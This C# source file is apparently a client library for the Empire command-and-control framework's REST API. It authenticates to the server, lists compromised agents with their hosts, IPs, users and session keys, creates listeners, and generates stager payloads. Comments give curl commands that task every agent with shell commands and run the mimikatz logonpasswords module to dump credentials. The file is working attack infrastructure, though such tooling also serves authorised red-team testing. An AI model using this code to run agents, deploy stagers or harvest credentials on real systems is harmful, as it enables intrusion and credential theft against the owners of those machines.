using System;
using System.IO;
using System.Linq;
using System.Collections;
using System.Collections.Generic;
using Newtonsoft.Json.Linq;

namespace c2interop{
    public class stager{
        public string name;
        public string description;
        public Dictionary<string,option> options;
        public string output;
    }

    public class option{
        public string Name;
        public string Description;
        public bool Required;
        public string Value;
    }

    public class listener{
        public string id;
        public string createdAt;
        public string listenerCategory;
        public string listenerType;
        public string module;
        public string name;
        public Dictionary<string,option> options;
    }

    public class agent{
        public string ID;
        public string checkin_time;
        public string external_ip;
        public string high_integrity;
        public string hostname;
        public string internal_ip;
        public string language;
        public string lastseen_time;
        public string listener;
        public string name;
        public string nonce;
        public string os_details;
        public string process_id;
        public string profile;
        public string session_id;
        public string session_key;
        public string stale;
        public string username;
    }

    public class EmpireAPI{
        ConfigRoot configRoot;
        string authToken;
        WebUtilities wu;
        string EmpireAPIEndpoint;

        public EmpireAPI(){
			using (StreamReader configReader = new StreamReader ("config.json")) {
				configRoot = ConfigRoot.FromJson(configReader.ReadToEnd());
			}
            EmpireAPIEndpoint = configRoot.Config.EmpireAPIEndpoint;
            wu = new WebUtilities(configRoot.Config.EnableProxy == "1",configRoot.Config.ProxyServer);
        }

        public string GetAuthToken(){
            Crypter c = new Crypter();            
            string username = c.Decrypt(configRoot.Config.EmpireAPIUsername);
            string password = c.Decrypt(configRoot.Config.EmpireAPIPassword);

            string authTokenJson =  wu.PostJSONData("{\"username\":\""+username+"\",\"password\":\""+ password + "\"}",EmpireAPIEndpoint + "/api/admin/login",false);
            authToken = JObject.Parse(authTokenJson)["token"].ToString();            

            return authToken;
        }

        /*
        # task the agent to run a shell command
        curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/agents/$AGENT/shell?token=$TOKEN -X POST -d '{"command":"whoami"}'

        # task all agents to run a shell command
        curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/agents/all/shell?token=$TOKEN -X POST -d '{"command":"pwd"}'

        # task the agent to run a module
        curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/modules/credentials/mimikatz/logonpasswords?token=$TOKEN -X POST -d "{\"Agent\":\"$AGENT\"}"
        */

        public List<agent> GetAgents(){
            if (authToken == null)throw new Exception("No AuthToken, call GetAuthToken");

            string listenerResponse =  wu.GetResponse
                (
                    EmpireAPIEndpoint +"/api/agents?token=" + authToken
                );

            List<agent> agents = new List<agent>();

            foreach (JObject arrayItem in (JArray)JObject.Parse(listenerResponse)["agents"]) {
                agent a = new agent(){
                    ID = arrayItem["ID"].ToString(),
                    checkin_time = arrayItem["checkin_time"].ToString(),
                    external_ip = arrayItem["external_ip"].ToString(),
                    high_integrity = arrayItem["high_integrity"].ToString(),
                    hostname = arrayItem["hostname"].ToString(),
                    internal_ip = arrayItem["internal_ip"].ToString(),
                    language = arrayItem["language"].ToString(),
                    lastseen_time = arrayItem["lastseen_time"].ToString(),
                    listener = arrayItem["listener"].ToString(),
                    name = arrayItem["listener"].ToString(),
                    nonce = arrayItem["nonce"].ToString(),
                    os_details = arrayItem["os_details"].ToString(),
                    process_id = arrayItem["process_id"].ToString(),
                    profile = arrayItem["profile"].ToString(),
                    session_id = arrayItem["session_id"].ToString(),
                    session_key = arrayItem["session_key"].ToString(),
                    stale = arrayItem["stale"].ToString(),
                    username = arrayItem["username"].ToString()
                };
                agents.Add(a);
            }

            return agents;
        }

        //Get list of all live listeners
        public List<listener> GetListeners(){
            if (authToken == null)throw new Exception("No AuthToken, call GetAuthToken");

            string listenerResponse =  wu.GetResponse
                (
                    EmpireAPIEndpoint +"/api/listeners?token=" + authToken
                );

            List<listener> listeners = new List<listener>();

            foreach (JObject arrayItem in (JArray)JObject.Parse(listenerResponse)["listeners"]) {
                listener l = new listener(){
                    id = arrayItem["ID"].ToString(),
                    createdAt = arrayItem["created_at"].ToString(),
                    listenerCategory = arrayItem["listener_category"].ToString(),
                    listenerType = arrayItem["listener_type"].ToString(),
                    module = arrayItem["module"].ToString(),
                    name = arrayItem["name"].ToString()
                };

                l.options = new Dictionary<string, option>();
                foreach(JProperty option in arrayItem["options"]){
                    option o = new option(){
                        Name = option.Name,
                        Description = option.Value["Description"].ToString(),
                        Required = option.Value["Required"].ToString() == "true" ? true : false,
                        Value = option.Value["Value"].ToString()
                    };

                    l.options.Add(option.Name,o);
                }

                listeners.Add(l);
            }

            return listeners; 
        }

        //curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/listeners/http?token= -X POST -d '{"Name":"testing"}'
        public string CreateListener(string listenerType,string listenerName,int port){
            if (authToken == null)throw new Exception("No AuthToken, call GetAuthToken");

            string listenerResponse =  wu.PostJSONData
                (
                    "{\"Name\":\"" + listenerName + "\",\"Port\":\"" + port.ToString() + "\"}",
                    EmpireAPIEndpoint +"/api/listeners/"+listenerType +"?token=" + authToken
                );

            return JObject.Parse(listenerResponse)["success"].ToString();
        }

        //curl --insecure -i https://localhost:1337/api/stagers?token=
        public List<stager> GetStagers(){
            if (authToken == null)throw new Exception("No AuthToken, call GetAuthToken");

            string stagersResponse = wu.GetResponse(
                EmpireAPIEndpoint +"/api/stagers?token=" + authToken
            );

            List<stager> stagers = new List<stager>();
            var stagerResponseParsed = JObject.Parse(stagersResponse);            

            foreach (JObject arrayItem in (JArray)stagerResponseParsed["stagers"]) {
                stager s = new stager(){
                    name = arrayItem["Name"].ToString(),
                    description = arrayItem["Description"].ToString(),
                };

                s.options = new Dictionary<string, option>();
                foreach(JProperty option in arrayItem["options"]){
                    option o = new option(){
                        Name = option.Name,
                        Description = option.Value["Description"].ToString(),
                        Required = option.Value["Required"].ToString() == "true" ? true : false,
                        Value = option.Value["Value"].ToString()
                    };

                    s.options.Add(option.Name,o);
                }
                stagers.Add(s);
            }      

            return stagers;
        }

        //# create a stager for this listener
        //curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/stagers?token=$TOKEN -X POST -d '{"StagerName":"launcher", "Listener":"testing","option1":"optionvalue"}'
        public stager GetListenerStager(string listenerName, stager s){
            if (authToken == null)throw new Exception("No AuthToken, call GetAuthToken");

            string listenerOptionFormat = ",\"{0}\":\"{1}\"";
            string listenerOptions = "";

            if(s.options != null && s.options.Count > 0){
                foreach(option o in s.options.Values)
                {
                    //We're already adding a listener, no need for duplication
                    if (o.Name != "Listener")
                        listenerOptions += String.Format(null,listenerOptionFormat,o.Name,o.Value.Replace("\\","\\\\"));
                }
            }

            string apiParameters ="{\"StagerName\":\"" + s.name + "\",\"Listener\":\"" + listenerName + "\"";
            if (listenerOptions != "")
                apiParameters+= listenerOptions;
            apiParameters+= "}";

            string stagerResponse =  wu.PostJSONData
                (
                    apiParameters,
                    EmpireAPIEndpoint +"/api/stagers?token=" + authToken
                );

            try{
                s.output = JObject.Parse(stagerResponse)[s.name]["Output"].ToString();
            }
            catch(Exception e){
                s.output = e.Message;
            }

            return s;
        }

    }

}